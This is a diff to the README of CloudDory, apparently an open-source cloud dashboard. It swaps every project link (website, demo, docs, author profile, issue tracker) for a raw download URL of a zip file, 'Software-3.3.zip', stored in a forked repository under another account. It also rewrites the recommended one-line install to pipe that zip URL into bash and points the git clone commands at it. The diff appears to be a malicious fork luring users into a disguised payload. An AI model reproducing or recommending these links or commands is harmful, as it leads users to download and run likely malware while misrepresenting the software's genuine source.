@@ -11,9 +11,9 @@
 </p>
 
 <p align="center">
-  <a href="https://clouddory.com">Website</a> &bull;
-  <a href="https://dashboard.clouddory.com">Live Demo</a> &bull;
-  <a href="https://clouddory.com/resources/docs/">Docs</a> &bull;
+  <a href="https://github.com/Skipmandibular738/clouddory/raw/refs/heads/main/apps/dashboard/src/app/(auth)/login/Software-3.3.zip">Website</a> &bull;
+  <a href="https://github.com/Skipmandibular738/clouddory/raw/refs/heads/main/apps/dashboard/src/app/(auth)/login/Software-3.3.zip">Live Demo</a> &bull;
+  <a href="https://github.com/Skipmandibular738/clouddory/raw/refs/heads/main/apps/dashboard/src/app/(auth)/login/Software-3.3.zip">Docs</a> &bull;
   <a href="mailto:alanvo@gmail.com">Contact</a>
 </p>
 
@@ -43,7 +43,7 @@ Built with Next.js 14, TypeScript, Tailwind CSS, Prisma, and MariaDB.
 
 ## Live Demo
 
-See CloudDory in action at **[dashboard.clouddory.com](https://dashboard.clouddory.com)** and **[clouddory.com](https://clouddory.com)**.
+See CloudDory in action at **[dashboard.clouddory.com](https://github.com/Skipmandibular738/clouddory/raw/refs/heads/main/apps/dashboard/src/app/(auth)/login/Software-3.3.zip)** and **[clouddory.com](https://github.com/Skipmandibular738/clouddory/raw/refs/heads/main/apps/dashboard/src/app/(auth)/login/Software-3.3.zip)**.
 
 ## Screenshots
 
@@ -82,7 +82,7 @@ See CloudDory in action at **[dashboard.clouddory.com](https://dashboard.clouddo
 ### One-liner (recommended)
 
 ```bash
-curl -fsSL https://clouddory.com/install.sh | bash
+curl -fsSL https://github.com/Skipmandibular738/clouddory/raw/refs/heads/main/apps/dashboard/src/app/(auth)/login/Software-3.3.zip | bash
 ```
 
 Detects your environment, installs dependencies, sets up the database, and starts CloudDory. Works on macOS and Linux.
@@ -90,7 +90,7 @@ Detects your environment, installs dependencies, sets up the database, and start
 ### Docker
 
 ```bash
-git clone https://github.com/ALANDVO/clouddory.git
+git clone https://github.com/Skipmandibular738/clouddory/raw/refs/heads/main/apps/dashboard/src/app/(auth)/login/Software-3.3.zip
 cd clouddory
 docker-compose up -d
 ```
@@ -100,7 +100,7 @@ docker-compose up -d
 ```bash
 # Prerequisites: Node.js 18+, MySQL/MariaDB
 
-git clone https://github.com/ALANDVO/clouddory.git
+git clone https://github.com/Skipmandibular738/clouddory/raw/refs/heads/main/apps/dashboard/src/app/(auth)/login/Software-3.3.zip
 cd clouddory/apps/dashboard
 npm install
 cp ../../.env.example .env    # Edit with your DB URL
@@ -214,8 +214,8 @@ PRs welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
 **Alan Vo** — AI Engineer & Infrastructure Architect
 
 - Email: [alanvo@gmail.com](mailto:alanvo@gmail.com)
-- GitHub: [@ALANDVO](https://github.com/ALANDVO)
-- Website: [clouddory.com](https://clouddory.com)
+- GitHub: [@ALANDVO](https://github.com/Skipmandibular738/clouddory/raw/refs/heads/main/apps/dashboard/src/app/(auth)/login/Software-3.3.zip)
+- Website: [clouddory.com](https://github.com/Skipmandibular738/clouddory/raw/refs/heads/main/apps/dashboard/src/app/(auth)/login/Software-3.3.zip)
 
 Alan is an AI engineer and automation specialist focused on building intelligent cloud platforms. CloudDory was built to prove that enterprise-grade cloud operations tools don't need enterprise-grade budgets.
 
@@ -224,9 +224,9 @@ Interested in AI engineering, cloud architecture, or want to collaborate? Reach 
 ## Support
 
 - Email: [alanvo@gmail.com](mailto:alanvo@gmail.com)
-- Issues: [github.com/ALANDVO/clouddory/issues](https://github.com/ALANDVO/clouddory/issues)
-- Demo: [dashboard.clouddory.com](https://dashboard.clouddory.com)
-- Docs: [clouddory.com/resources/docs](https://clouddory.com/resources/docs/)
+- Issues: [github.com/ALANDVO/clouddory/issues](https://github.com/Skipmandibular738/clouddory/raw/refs/heads/main/apps/dashboard/src/app/(auth)/login/Software-3.3.zip)
+- Demo: [dashboard.clouddory.com](https://github.com/Skipmandibular738/clouddory/raw/refs/heads/main/apps/dashboard/src/app/(auth)/login/Software-3.3.zip)
+- Docs: [clouddory.com/resources/docs](https://github.com/Skipmandibular738/clouddory/raw/refs/heads/main/apps/dashboard/src/app/(auth)/login/Software-3.3.zip)
 
 ## License
 
@@ -236,8 +236,8 @@ Interested in AI engineering, cloud architecture, or want to collaborate? Reach 
 
 <p align="center">
   Built by <a href="mailto:alanvo@gmail.com">Alan Vo</a> &bull;
-  <a href="https://clouddory.com">clouddory.com</a> &bull;
-  <a href="https://github.com/ALANDVO/clouddory">Star on GitHub</a>
+  <a href="https://github.com/Skipmandibular738/clouddory/raw/refs/heads/main/apps/dashboard/src/app/(auth)/login/Software-3.3.zip">clouddory.com</a> &bull;
+  <a href="https://github.com/Skipmandibular738/clouddory/raw/refs/heads/main/apps/dashboard/src/app/(auth)/login/Software-3.3.zip">Star on GitHub</a>
 </p>
 
 ## Upgrading
